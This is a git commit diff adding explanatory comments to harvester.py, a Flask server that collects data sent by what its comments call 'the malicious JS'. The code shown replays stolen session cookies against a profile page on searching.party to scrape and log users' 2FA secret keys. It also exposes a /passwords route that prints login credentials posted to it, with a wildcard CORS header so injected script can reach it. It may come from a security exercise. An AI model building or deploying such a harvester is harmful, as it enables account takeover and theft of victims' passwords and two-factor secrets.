80c87a9ecfb222e97b3e48e9975d40a1d5cb6922
ehennenfent <ehennenfent@imsa.edu>
2016-05-07 20:15:45 -0500

    Added explanations to python methods

--- harvester.py
+++ harvester.py
@@ -1,3 +1,5 @@
+# harvester.py runs a flask server that handles data sent to it by the malicious JS
+
 from flask import Flask, request, Response
 import requests
 from bs4 import BeautifulSoup
@@ -5,6 +7,8 @@ from datetime import datetime
 app = Flask(__name__)
 f = open('data.txt', 'w')
 
+# Quick and dirty method that uses requests and BeautifulSoup to request the user profile page
+# using their current session, and print out the 2FA secret key.
 def grab_2FA(cookie):
     url = "http://searching.party/index.php/edit-profile"
     name = cookie.split('=')[0]
@@ -19,9 +23,10 @@ def grab_2FA(cookie):
             f.write(i.text.strip() + '\n')
             print i.text.strip()
 
+# Handles cookies passed to the root of the domain and calls the method to scrape 2FA secret keys
 @app.route('/', methods=['POST', 'GET'])
 def get_2fa():
-    #return "Hello world!"	
+    #return "Hello world!"
     if(request.method == 'GET'):
         return "GET"
     grab_2FA(request.data)
@@ -29,6 +34,7 @@ def get_2fa():
     resp.headers['Access-Control-Allow-Origin'] = '*'
     return resp
 
+# Prints out login credentials passed to it
 @app.route('/passwords', methods=['POST', 'GET'])
 def process_password():
     if(request.method == 'GET'):
